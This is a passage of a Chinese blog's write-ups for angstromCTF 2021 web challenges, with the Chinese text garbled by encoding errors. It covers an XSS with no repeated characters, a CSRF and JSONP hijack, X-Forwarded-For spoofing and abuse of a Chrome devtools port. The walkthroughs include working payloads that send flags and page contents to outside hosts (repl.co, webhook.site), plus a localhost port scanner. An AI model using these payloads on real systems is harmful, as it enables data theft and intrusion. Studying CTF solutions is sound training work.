ä¸ç„¶å¾ˆå¿«å°±èƒ½å‡ºã€‚ã€‚ã€‚ğŸ˜¦</p><p>æœ¬é¢˜åŒæ ·æ˜¯xss.å…³é”®ä»£ç åœ¨äº</p><pre><code class="python">def add_component(name, cfg, bucket):    if not name or not cfg:        return (ERR, &quot;Missing parameters&quot;)    if len(bucket) &gt;= 2:        return (ERR, &quot;Bucket too large (our servers aren&#39;t very good :((((()&quot;)    if len(cfg) &gt; 250:        return (ERR, &quot;Config too large (our servers aren&#39;t very good :((((()&quot;)    if name == &quot;welcome&quot;:        if len(bucket) &gt; 0:            return (ERR, &quot;Welcomes can only go at the start&quot;)        bucket.append(            &quot;&quot;&quot;            &lt;form action=&quot;/newcomp&quot; method=&quot;POST&quot;&gt;                &lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;component name&quot;&gt;                &lt;input type=&quot;text&quot; name=&quot;cfg&quot; placeholder=&quot;component config&quot;&gt;                &lt;input type=&quot;submit&quot; value=&quot;create component&quot;&gt;            &lt;/form&gt;            &lt;form action=&quot;/reset&quot; method=&quot;POST&quot;&gt;                &lt;p&gt;warning: resetting components gets rid of this form for some reason&lt;/p&gt;                &lt;input type=&quot;submit&quot; value=&quot;reset components&quot;&gt;            &lt;/form&gt;            &lt;form action=&quot;/contest&quot; method=&quot;POST&quot;&gt;                &lt;div class=&quot;g-recaptcha&quot; data-sitekey=&quot;{}&quot;&gt;&lt;/div&gt;                &lt;input type=&quot;submit&quot; value=&quot;submit site to contest&quot;&gt;            &lt;/form&gt;            &lt;p&gt;Welcome &lt;strong&gt;{}&lt;/strong&gt;!&lt;/p&gt;            &quot;&quot;&quot;.format(                captcha.get(&quot;sitekey&quot;), escape(cfg)            ).strip()        )    elif name == &quot;char_count&quot;:        bucket.append(            &quot;&lt;p&gt;{}&lt;/p&gt;&quot;.format(                escape(                    f&quot;&lt;strong&gt;{len(cfg)}&lt;/strong&gt; characters and &lt;strong&gt;{len(cfg.split())}&lt;/strong&gt; words&quot;                )            )        )    elif name == &quot;text&quot;:        bucket.append(&quot;&lt;p&gt;{}&lt;/p&gt;&quot;.format(escape(cfg)))    elif name == &quot;freq&quot;:        counts = Counter(cfg)        (char, freq) = max(counts.items(), key=lambda x: x[1])        bucket.append(            &quot;&lt;p&gt;All letters: {}&lt;br&gt;Most frequent: &#39;{}&#39;x{}&lt;/p&gt;&quot;.format(                &quot;&quot;.join(counts), char, freq            )        )    else:        return (ERR, &quot;Invalid component name&quot;)    return (OK, bucket)</code></pre><p>name æœ‰å››ç§æ–¹å¼,éƒ½ä¼šæŠŠéƒ¨åˆ†htmlå¡å…¥<code>bucket</code>ã€‚æˆ‘ä»¬è®¿é—®é¡µé¢æ—¶bucketä¼šä½œä¸ºhtmlä»£ç è¿”å›ã€‚ç›®æ ‡æ˜¯xssæ‹¿åˆ°adminçš„bucketå†…å®¹</p><p>æ³¨æ„åˆ°ï¼Œå››ç§æ–¹å¼é‡Œåªæœ‰ä¸€ç§<code>freq</code>æ˜¯å¡å…¥çš„æ²¡æœ‰ç»è¿‡<code>escape</code>çš„ä»£ç ã€‚ä¹Ÿå°±æ˜¯è¯´æƒ³åšåˆ°xss,å°±è¦å¡å…¥<code>&lt;</code>,ä¹Ÿå°±åªèƒ½é€‰è¿™æ¡è·¯äº†ã€‚</p><p>ä½†æ˜¯å…¶è¦æ±‚å¾ˆä¸¥è‹›ã€‚ä»–å›æ˜¾çš„æ˜¯<code>&quot;&quot;.join(counts) =&gt; &quot;&quot;.join(Counter(cfg))</code>ã€‚å°±æ˜¯è¯´æˆ‘ä»¬payloadä¸­é‡å¤çš„éƒ¨åˆ†ä¼šè¢«å»æ‰ã€‚æˆ‘ä»¬è¦å°è¯•<strong>æ²¡æœ‰é‡å¤å­—ç¬¦çš„</strong>xss. è¿‘ä¼¼è§£å†³çš„æƒ³æ³•è‡ªç„¶æ˜¯<code>&lt;script src=http://xxx/&gt;</code>ã€‚ä½†åƒåŸŸåæˆ–è€…å…¶ä»–ä½ç½®ä»ç„¶æœ‰é‡å¤å­—ç¬¦ã€‚</p><p>è¿™é‡Œæˆ‘å¾ˆå¿«æƒ³åˆ°ä¸€ä¸ªå¾ˆè‘—åçš„é—®é¢˜ <a href="http://www.unicode.org/reports/tr46/" target="_blank" rel="noopener">http://www.unicode.org/reports/tr46/</a>ã€‚ä¹Ÿå°±æ˜¯ä¸åŒå­—ç¬¦é€ æˆç›¸åŒdomainè§£æçš„é—®é¢˜(ä¸ºäº†ç…§é¡¾ä¸åŒè¯­ç§ç”¨æˆ·)ã€‚</p><p>åŒæ—¶,htmlæ ‡ç­¾æ”¯æŒå¤§å°å†™ã€‚é‚£ä¹ˆæƒ³è¦ä¸é‡å¤å­—ç¬¦å¤§æ¦‚åªæœ‰ä¸€ç§æ–¹å¼äº†<br><code>&lt;SCRIPT src=//YOUR_DOMAIN&gt;</code><br>æ³¨æ„<code>//</code>è¿™ç§åŠ è½½æ–¹å¼ã€‚å¦‚æœè·‘åœ¨webæœåŠ¡å™¨ä¸Šï¼Œhttpså°±ä¼šè‡ªåŠ¨æ‰¾<code>https://YOUR_DOMAIN</code>,httpå°±ä¼šè‡ªåŠ¨æ‰¾<code>http://YOUR_DOMAIN</code>ã€‚</p><p>ä¸è¿‡æˆ‘ä»¬æ²¡æ³•ä¼ å…¥ä¿©ä¸ª<code>/</code>ã€‚å½“ç„¶,å°è¯•<code>hTtp:/xxx</code>ç¼©å‡ä¸€ä¸ª<code>/</code>ä¹Ÿæ˜¯å¯ä»¥çš„,å¯æƒœè¿™æ ·<code>t</code>å­—ç¬¦åˆä¼šé‡å¤ã€‚ç®€å•æµ‹è¯•äº†ä¸‹ï¼Œå‘ç°<code>\</code>å¯ä»¥æ›¿ä»£<code>/</code>(unicode  <code>/</code>å­—ç¬¦ä¸èƒ½æ›¿ä»£)ã€‚æ‰€ä»¥æœ€åè½¬ä¸‹domainä¸ºunicodeå°±å¯ä»¥äº†ã€‚(æˆ–è€…ä¹Ÿè®¸æœ‰dalao æœ‰ä¸è·Ÿå‰é¢å­—ç¬¦é‡å¤çš„çŸ­åŸŸåï¼Ÿ)è¿™é‡Œæˆ‘å› ä¸ºæ²¡å¼€https,æ²¡æœ‰åšå®¢ä»¥å¤–çš„åŸŸåï¼Œåªå¥½å» <a href="repl.it">repl.it</a> å¼€äº†ä¸ªä¸´æ—¶node 2333</p><p>domainçš„è½¬æ¢å¯ä»¥ä½¿ç”¨ <a href="https://splitline.github.io/domain-obfuscator/" target="_blank" rel="noopener">https://splitline.github.io/domain-obfuscator/</a> ä¹‹å‰åœ¨bamboofox CTFä¸­ç”¨è¿‡</p><pre><code class="python">def add():    r = requests.post(url + &#39;newcomp&#39;, data={        &#39;name&#39;: &quot;freq&quot;,        &#39;cfg&#39;: &quot;&lt;SCRIPT src=\/â…¹ï¼â„¬â“â“’ãŠµ4ã€‚áµ£â‚‘â‚šâ„“ï½¡â„­Âº&gt;&quot;    }, cookies={        &#39;session&#39;: &quot;eyJ1c2VybmFtZSI6ImJ5YzQwNiJ9.YGkXgQ.QZ2FZ8USqQHWcjStB4p6tTfbsUo&quot;    })    print(r.text)add()</code></pre><p>repl.itä¸Šæ”¾çš„æ˜¯</p><pre><code class="javascript">fetch(&#39;/?fakeuser=admin&#39;).then(r =&gt; r.text()).then(r =&gt; fetch(`https://x.byc404.repl.co/?flag=${btoa(r)}`,{&#39;mode&#39;:&#39;no-cors&#39;}))</code></pre><p>ps: å…¶å®è¿™ä¸ªunicodeçš„é—®é¢˜åœ¨nodejs 8åŠä»¥å‰å¾—ç‰ˆæœ¬è¡¨ç°å¾—æ¯”è¾ƒä¸¥é‡ã€‚å› ä¸ºå…¶<code>http</code>åº“åœ¨è¿™åŸºç¡€ä¸Šæ²¡æœ‰è¿‡æ»¤æ‰<code>\r\n</code>ã€‚ç›´æ¥å¯¼è‡´CRLFã€‚</p><h2 id="jason"><a href="#jason" class="headerlink" title="jason"></a>jason</h2><p>CSRFã€‚ æºç å…³é”®éƒ¨åˆ†å¦‚ä¸‹</p><pre><code class="javascript">function sameOrigin (req, res, next) {    if (req.get(&#39;referer&#39;) &amp;&amp; !req.get(&#39;referer&#39;).startsWith(process.env.URL))        return res.sendStatus(403)     return next()}app.post(&#39;/passcode&#39;, function (req, res) {    if (req.body.passcode === &#39;CLEAR&#39;) res.append(&#39;Set-Cookie&#39;, &#39;passcode=&#39;)    else res.append(&#39;Set-Cookie&#39;, `passcode=${(req.cookies.passcode || &#39;&#39;)+req.body.passcode}`)    return res.redirect(&#39;/&#39;)})app.post(&#39;/visit&#39;, async function (req, res) {    if (req.body.site.startsWith(&#39;http&#39;)) try {await jason.visit(req.body.site) } catch (e) {console.log(e)}    return res.redirect(&#39;/&#39;)})app.get(&#39;/languages&#39;, sameOrigin, function (req, res) {    res.jsonp({category: &#39;languages&#39;, items: [&#39;C++&#39;, &#39;Rust&#39;, &#39;OCaml&#39;, &#39;Lisp&#39;, &#39;Physical touch&#39;]})})app.get(&#39;/friends&#39;, sameOrigin, function (req, res) {    res.jsonp({category: &#39;friends&#39;, items: [&#39;Functional programming&#39;]})})app.get(&#39;/flags&#39;, sameOrigin, function (req, res) {    console.log(req.cookies);    if (req.cookies.passcode !== process.env.PASSCODE) return res.sendStatus(403)    res.jsonp({category: &#39;flags&#39;, items: [process.env.FLAG]})})app.listen(7331)</code></pre><p>å…¶ä¸­visitéƒ¨åˆ†æ˜¯ä¸ª puppeteer çš„botè®¿é—®ã€‚</p><p>é¦–å…ˆå¾ˆæ˜æ˜¾ã€‚flagåœ¨jsonpå¤„ã€‚ç†è®ºä¸Šè·å¾—jsonpè¿”å›å€¼å³å¯ã€‚ä½†æ˜¯å®ƒä½œäº†refererçš„æ£€æŸ¥ã€‚è¿™ä¸ªå€’æ˜¯æŒºå¥½ç»•ã€‚å› ä¸ºå®ƒåªè€ƒè™‘äº†æœ‰refererçš„æƒ…å†µä¸‹éœ€è¦ä»å®ƒçš„ä¸»ç«™æ¥ã€‚æ‰€ä»¥ä¸å¸¦refererå³å¯ã€‚</p><p>ä½†æ˜¯ï¼Œæ­¤å¤„æˆ‘ä»¬æƒ³å¤–å¸¦dataå¿…ç„¶è¦åŠ«æŒjsonpã€‚ä¹Ÿå°±æ˜¯è¦è®©å…¶è¿”å›å†…å®¹ä½œä¸ºé¡µé¢ä¸‹çš„å¯æ§javascriptã€‚æ‰€ä»¥å¾—ç”¨scriptæ¥è·¨åŸŸåŠ è½½ã€‚ (ç°åœ¨chromeçš„CORBé˜²èŒƒçœŸçš„éå¸¸ä¸¥æ ¼ï¼Œscriptåªä¼šè·¨åŸŸåŠ è½½ text/javascriptçš„èµ„æº,ä¸è¿‡è¿˜å¥½jsonpæœ¬èº«å°±æ˜¯ç§è·¨åŸŸæ–¹å¼)</p><pre><code class="javascript">const script = document.createElement(&#39;script&#39;);script.referrerpolicy = &#39;no-referrer&#39;script.src = &quot;http://127.0.0.1:7331/flags?callback=load&quot;document.head.appendChild(script)</code></pre><p>è·å¾—jsonpçš„æ–¹æ³•æ˜ç™½äº†ä¹‹åè¿˜æœ‰ä¸€ç‚¹æ³¨æ„ï¼Œæˆ‘ä»¬éœ€è¦adminå¸¦cookieè®¿é—®æ‰èƒ½è·å¾—flagsçš„jsonpå†…å®¹ã€‚ç„¶è€Œè¿™é‡Œæ˜¯express è‡ªå¸¦çš„jsonpè€Œä¸æ˜¯é‚£ç§phpè‡ªå†™çš„jsonpã€‚å…¶callbackå¹¶ä¸èƒ½åšåˆ°ä»»æ„å­—ç¬¦,ä¹Ÿå°±æ²¡æœ‰xssäº†ã€‚æ‰€ä»¥è¿™ä¸ªç«™å¹¶æ²¡æœ‰xssåˆ©ç”¨æ¥è·å–domçš„å†…å®¹</p><p>æ‰€ä»¥ã€‚å•çº¯åˆ©ç”¨csrfæ€ä¹ˆæ‰èƒ½æœ‰æƒè®¿é—®jsonpå‘¢ï¼Ÿè¿™é‡Œå¦‚æœæ³¨æ„åˆ°passcodeçš„å¥‡æ€ªå†™æ³•ï¼Œæ–¹æ³•å°±æ°´è½çŸ³å‡ºäº†ã€‚</p><pre><code class="javascript">res.append(&#39;Set-Cookie&#39;, `passcode=${(req.cookies.passcode || &#39;&#39;)+req.body.passcode}`)</code></pre><p>æ­¤å¤„passcodeå®Œå…¨å¯æ§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨set-cookieåŸæœ¬çš„cookieååŠ å…¥ä»»æ„å†…å®¹ã€‚è¦åŠ ä»€ä¹ˆï¼Œæˆ–è€…è¯´èƒ½åŠ ä»€ä¹ˆï¼ŒMDNå†™çš„æ˜¯å¾ˆæ¸…æ¥šçš„<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_f48c550dfca0159fbd55272b9452de57.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_f48c550dfca0159fbd55272b9452de57.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>cookieçš„å‡ ä¸ªå®‰å…¨å±æ€§ä¸­ã€‚httpOnlyä¸SameSite æ˜¯ç”¨çš„éå¸¸å¤šçš„ã€‚å…¶ä¸­httpOnlyå¯ä»¥é˜²æ­¢é€šè¿‡domè·å–cookie.SameSiteåˆ™æŒ‡å®šcookieçš„ä½œç”¨åŸŸã€‚å°¤å…¶åœ¨è·¨åŸŸè¯·æ±‚ä¸Šä½œç”¨å¾ˆå¤§ã€‚(å¦‚æœsamesite ä¸ºnone, å³ä½¿æ˜¯csrfä¹Ÿå¯ä»¥åˆ©ç”¨è·¨åŸŸè¯·æ±‚è¿›è¡Œxsleak)</p><p>ä¸€èˆ¬æ¥è¯´æ²¡æœ‰è®¾ç½®SameSite çš„è¯ï¼Œé»˜è®¤æ˜¯ä¸ºLaxçš„ã€‚ä¹Ÿå°±æ˜¯é»˜è®¤é˜²csrf.æ‰€ä»¥è¿™é‡Œç›´æ¥åˆ©ç”¨passcode è®¾ç½®ä¸ºNoneå³å¯ã€‚</p><p>æ³¨æ„çš„æ˜¯ã€‚ç°åœ¨SameSite ä¸ºNone.æ—¶ï¼Œå¿…é¡»è®¾ç½®Secureä¸ºtrue,ä¹Ÿå°±æ˜¯å¿…é¡»åœ¨httpsä¸Š(é™¤äº†localhost)æ‰æœ‰æ•ˆã€‚<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_bcfd6ba59de0ccd6ec9717356a773f18.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_bcfd6ba59de0ccd6ec9717356a773f18.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œç®€å•å†™ä¸ªè¡¨å•æäº¤(å…¶ä»–è¯·æ±‚å¦‚fetchä¸ä¼šé¡ºç€è·³è½¬ã€‚è¿™æ ·set-cookie å°±æ²¡æ„ä¹‰äº†ã€‚)ã€‚æˆ‘ä»¬åœ¨æœ¬é¡µé¢å¼€ä¸ªæ–°çª—å£æ‰§è¡Œè¡¨å•åä¸€ç›´è°ƒç”¨ location.reload()åˆ·æ–°æœ¬é¡µé¢ã€‚è¿™æ ·ç­‰cookieåœ¨æˆ‘ä»¬çš„æ¶æ„htmlå¤„ç”Ÿæ•ˆæ—¶ï¼Œå°±ä¼šè°ƒç”¨è¢«åŠ«æŒçš„loadäº†ã€‚è¿™é‡Œå¯ä»¥fetchè¯·æ±‚ä¸‹è‡ªå·±çš„ç«™å¤–å¸¦æ•°æ®ï¼Œä¹Ÿå¯ä»¥<code>navigator.sendBeacon</code> postæ•°æ®</p><p>è¿™é‡Œå› ä¸ºä»–è¿œç¨‹çš„puppeteer æ²¡æœ‰timeout.æ‰€ä»¥æœ€å¥½æŠŠinterValçš„é—´éš”è®¾çŸ­ç‚¹ã€‚</p><pre><code class="html">&lt;script&gt;        const script = document.createElement(&#39;script&#39;);        script.referrerpolicy = &#39;no-referrer&#39;        script.src = &quot;http://127.0.0.1:7331/flags?callback=load&quot;        document.head.appendChild(script)        const load =  (data) =&gt; {                navigator.sendBeacon(&#39;https://webhook.site/48cbda29-080e-442f-8040-7a52a9093234&#39;, window.btoa(data))        }        w = window.open(&#39;poc2.html&#39;)        setInterval(() =&gt; {                location.reload()        }, 100)&lt;/script&gt;</code></pre><pre><code class="html">&lt;form action=&quot;http://127.0.0.1:7331/passcode&quot; method=&quot;post&quot; id=&quot;form&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;passcode&quot; value=&quot;; SameSite=None; Secure&quot;&gt;&lt;/form&gt;&lt;script&gt;form.submit()&lt;/script&gt;</code></pre><p>åæ¥çœ‹äº†å®˜æ–¹é¢˜è§£ã€‚åŸºæœ¬æ˜¯ä¸€è‡´çš„ã€‚ä¸è¿‡ä»–ç”¨<code>localStorage.done = true</code>ä¹Ÿå°±æ˜¯localStorageæ¥å­˜äº†ä¸ªæ ‡è®°å˜é‡ã€‚è¿™æ ·çš„è¯ä¿è¯åªä¼šåœ¨è¡¨å•æäº¤å¥½ï¼Œå¹¶ä¸”è·³è½¬å®Œåæ‰reload.</p><pre><code class="javascript">setInterval(function () {        try { w.location.href }        catch (e) { localStorage.done = true; location.reload() }    }, 10)</code></pre><p><code>actf{jason&#39;s_site_isn&#39;t_so_lax_after_all}</code></p><h2 id="Spoofy"><a href="#Spoofy" class="headerlink" title="Spoofy"></a>Spoofy</h2><p>è¿™é¢˜æ²¡åšã€‚ã€‚ã€‚ä½†æ˜¯è§£å‡ºäººæ•°æŒºå¤šçš„ã€‚åæ¥å‘ç°å¯èƒ½æ˜¯é”™è¿‡äº†ä¸€ç¯‡æ–‡ç« </p><p><a href="https://jetmind.github.io/2016/03/31/heroku-forwarded.html" target="_blank" rel="noopener">https://jetmind.github.io/2016/03/31/heroku-forwarded.html</a></p><p>ç®€å•çš„è¯´ã€‚å°±æ˜¯herokuå¯èƒ½ä¼šæŠŠçœŸå®ip appendåˆ°x-forwarded-for åã€‚å‡å¦‚ä¼ çš„æ—¶å€™å¸¦äº†ä¸¤ä¸ªxffã€‚å°±å¯èƒ½ä¼šè§£ææˆ</p><pre><code>{&quot;x-forwarded-for&quot; &quot;10.10.10.10,99.99.99.99,20.20.20.20&quot;}</code></pre><p>å…¶ä¸­ 99.99.99.99 æ˜¯è¢«åŠ è¿›å»çš„çœŸå®ipã€‚<br>æœ¬é¢˜æºç éƒ¨åˆ†åªè¦æ±‚xff é‡Œ<code>,</code> åˆ†å‰²åçš„ipé‡Œã€‚ç¬¬ä¸€ä¸ªä¸æœ€åä¸€ä¸ªç›¸åŒä¸”ä¸º<code>1.3.3.7</code>ã€‚æ‰€ä»¥åŠ ä¸ªé€—å·å³å¯</p><pre><code>X-Forwarded-For: 1.3.3.7X-Forwarded-For: , 1.3.3.7</code></pre><h2 id="Watered-Down-Watermark-as-a-Service"><a href="#Watered-Down-Watermark-as-a-Service" class="headerlink" title="Watered Down Watermark as a Service"></a>Watered Down Watermark as a Service</h2><p>è¿™é¢˜å› ä¸ºæ²¡æ—¶é—´å°±æ²¡çœ‹ã€‚ä½†æ˜¯è®°å¾—é¢˜ç›®ååœ¨diceCTFé‡Œå‡ºç°è¿‡ã€‚åæ¥èµ›åå‘ç°diceCTFçš„éé¢„æœŸåœ¨è¿™é‡Œè¿˜æœ‰ã€‚å½“æ—¶åœ¨discordé‡Œè§åˆ°æœ‰å¸ˆå‚…æåˆ°ç”¨chromeçš„devtools portåšçš„ã€‚å°è±¡è¿˜å¾ˆæ·±åˆ»ã€‚ä¸€æ–¹é¢ï¼ŒbyteCTF çº¿ä¸‹å†³èµ›æœ‰ä¸ªmarkdownxss, å¥½åƒæ˜¯æ‰¾æµè§ˆå™¨0day xss åå†åˆ©ç”¨chrome çš„devtools port æ¥ç€ã€‚å¦ä¸€æ–¹é¢æˆ‘è‡ªå·±å†™seleniumçˆ¬è™«æ—¶å‘ç°å¦‚æœè°ƒç”¨çš„æ˜¯<code>selenium-webdriver/chrome</code> ä¹Ÿå°±æ˜¯è‡ªå·±åº“é‡Œçš„chromeè€Œä¸æ˜¯æœ¬æœºçš„chromeæ—¶ï¼Œä¼šè‡ªåŠ¨å¼€ä¸ªdevtools ç«¯å£æ¥è°ƒè¯•ã€‚æ­¤é¢˜ç”¨åˆ°çš„puppeteerä¹Ÿæ˜¯ä¸€æ ·</p><p>é¦–å…ˆç¬¬ä¸€æ­¥æ˜¯æ‰¾åˆ°devtools çš„ç«¯å£ã€‚ç”±äºå¯ä»¥é€šè¿‡http è®¿é—®ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦å°èŒƒå›´çˆ†ç ´å³å¯ã€‚æ³¨æ„æºç çš„é™åˆ¶</p><pre><code class="javascript">app.use((req, res, next) =&gt; {    res.set(&#39;X-Frame-Options&#39;, &#39;deny&#39;);    res.set(&#39;X-Content-Type-Options&#39;, &#39;nosniff&#39;);    next()})...async function visit (url) {    if (!checkURL(url)) return &#39;no!!!!&#39;    let ctx = await (await browser).createIncognitoBrowserContext()    let page = await ctx.newPage()    page.on(&#39;framenavigated&#39;,function(frame){        if (!checkURL(frame.url())) return &#39;no!!!!&#39;    })    ......function checkURL(url) {    const urlobj = new URL(url)    if(!urlobj.protocol || ![&#39;http:&#39;,&#39;https:&#39;].some(x=&gt;urlobj.protocol.includes(x)) || urlobj.hostname.includes(&quot;actf.co&quot;)) return false    return true}</code></pre><p>ä¸€æ–¹é¢é™åˆ¶äº†iframeã€‚( å¦‚æœé¡µé¢åŠ è½½å¤±è´¥ã€‚å®ƒä¼šå®šå‘åˆ°chrome://network-error/ã€‚è€Œè¿™ä¸ªå°±æ²¡æ³•åˆ¤æ–­äº†)ã€‚åŒæ—¶ä¹Ÿç”¨<code>X-Content-Type-Options</code>é™åˆ¶äº†script.ä¸èƒ½scriptè·¨åŸŸåŠ è½½ã€‚</p><p>æ‰€ä»¥æ­¤å¤„æˆ‘ä»¬å¯ä»¥ç”¨å…¶ä»–è·¨åŸŸè¯·æ±‚æ–¹æ³•ã€‚fetch + no-corså³å¯ã€‚</p><pre><code class="javascript">&lt;html&gt;&lt;head&gt;byc&lt;/head&gt;&lt;body&gt;&lt;script&gt;for (let port = 40000; port &lt; 45000; port++) {    const url = `http://127.0.0.1:${port}`    fetch(url, {mode: &#39;no-cors&#39;}).then(res =&gt; {        document.body.innerHTML += `\n${url}`    })}&lt;/script&gt;        &lt;link rel=&quot;stylesheet&quot; href=&quot;http://difajosdifjwioenriqoewrowifjaoijdaf.com&quot;&gt;    &lt;/body&gt;    &lt;/html&gt;</code></pre><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_9f8a44adf3b87817bffebb31c0f2cb28.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_9f8a44adf3b87817bffebb31c0f2cb28.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¹‹åæˆ‘ä»¬è®¿é—®å…¶<code>json/new</code>è·¯ç”±ã€‚ä»–ä¼š</p><blockquote><p>Opens a new tab. Responds with the websocket target data for the new tab.</p></blockquote><p>è¿™æ ·å°±ä¼šæ–°å¼€ä¸€ä¸ªæ ‡ç­¾é¡µã€‚ä¸”æˆ‘ä»¬èƒ½æ‰§è¡Œä»»æ„js.ä¸ºäº†è·å–flagè‡ªç„¶æ˜¯<code>http://127.0.0.1:40027/json/new?file:///app/flag.txt</code> æ¥ç”¨æµè§ˆå™¨æ‰“å¼€flag</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_0755bcaf56fc15a780806f90ddb83fb7.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_0755bcaf56fc15a780806f90ddb83fb7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ ¹æ® <a href="https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate" target="_blank" rel="noopener">https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate</a></p><p>æˆ‘ä»¬å¯ä»¥ç”¨Runtime.evaluate æ¥æ‰§è¡Œä»»æ„js</p><pre><code class="javascript">window.ws = new WebSocket(`ws://127.0.0.1:40027/devtools/page/98D1EC60387BE0038D514389E2887339 `)ws.onmessage = (e =&gt; { document.writeln(&quot;&lt;h3&gt;&quot; + e.data + &quot;&lt;/h3&gt;&quot;); })ws.onopen = () =&gt; {    ws.send(JSON.stringify({        id: 1,        method: &#39;Runtime.evaluate&#39;,        params: { expression: &#39;document.body.innerHTML&#39; }    }))}</code></pre><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_ef0259a59051d89cd59c3a272b05de51.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_ef0259a59051d89cd59c3a272b05de51.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿˜æ˜¯å­¦åˆ°å¾ˆå¤šçš„ã€‚é¢„æœŸå¥½åƒæ˜¯æ„é€ BSON æ•°æ®ã€‚æ„Ÿè§‰è·Ÿwebå…³ç³»ä¸å¤§ã€‚ã€‚ã€‚</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>  æ€»çš„æ¥è¯´é¢˜ç›®è´¨é‡éƒ½å¾ˆä¸é”™ã€‚å¾ˆéš¾æƒ³è±¡æ˜¯ç»™é«˜ä¸­ç”Ÿå‡†å¤‡çš„é¢˜ã€‚ã€‚ã€‚å…³äºå‰ç«¯çš„ä¸€äº›çŸ¥è¯†è‡ªå·±ä¹Ÿæœ‰äº†ä¸€äº›æ–°çš„è§è§£ã€‚å¸Œæœ›èƒ½æœ‰æœºä¼šæ€»ç»“ä¸‹ã€‚</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://github.com/qxxxb/ctf/tree/master/2021/angstrom_ctf/watered_down_watermark" target="_blank" rel="noopener">https://github.com/qxxxb/ctf/tree/master/2021/angstrom_ctf/watered_down_watermark</a></p><p><a href="https://github.com/r00tstici/writeups/tree/master/angstromCTF_2021/spoofy" target="_blank" rel="noopener">https://github.com/r00tstici/writeups/tree/master/angstromCTF_2021/spoofy</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D^3CTF 8-bit-pub</title>
      <link href="2021/03/06/D%5E3CTF-8-bit-pub/"/>
      <url>2021/03/06/D%5E3CTF-8-bit-pub/</url>
      
